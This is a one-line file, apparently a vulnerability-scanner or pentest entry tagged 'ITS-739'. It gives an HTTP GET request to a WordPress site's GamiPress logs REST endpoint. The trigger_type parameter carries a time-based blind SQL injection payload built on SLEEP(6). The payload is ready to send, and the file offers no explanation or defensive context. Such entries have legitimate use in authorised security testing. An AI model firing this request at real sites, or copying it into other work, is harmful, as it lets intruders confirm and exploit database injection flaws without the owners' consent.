# Vulnerable: ITS-739
GET /wp-json/wp/v2/gamipress-logs?trigger_type[]=test')%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(6)))x)%20AND%20('a'='a
